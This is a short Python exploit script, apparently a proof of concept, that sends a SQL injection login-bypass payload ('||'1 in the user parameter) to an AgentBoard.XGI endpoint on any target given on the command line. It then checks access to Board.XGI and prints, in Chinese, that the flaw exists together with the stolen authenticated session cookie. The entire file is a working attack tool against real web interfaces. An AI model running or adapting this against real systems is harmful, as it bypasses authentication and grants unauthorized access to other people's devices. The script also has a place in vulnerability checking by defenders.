#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import json
import re

urllib3.disable_warnings()

def verify(site):
    burp0_url = site +  "/AgentBoard.XGI?user='||'1&cmd=UserLogin"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36"}
    r1 = requests.get(burp0_url, headers=burp0_headers, verify=False)
    cookie = r1.headers["Set-Cookie"]
    burp0_headers["Cookie"] = cookie
    url2 = site + "/Board.XGI"
    r2 = requests.get(url2, headers=burp0_headers, verify=False)
    if "src=\"custom/" in r2.text:
        return cookie
    return ""

if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，利用 SQL 注入万能登录后的 cookie 结果为：", info)
    else:
        print("[-]漏洞不存在")
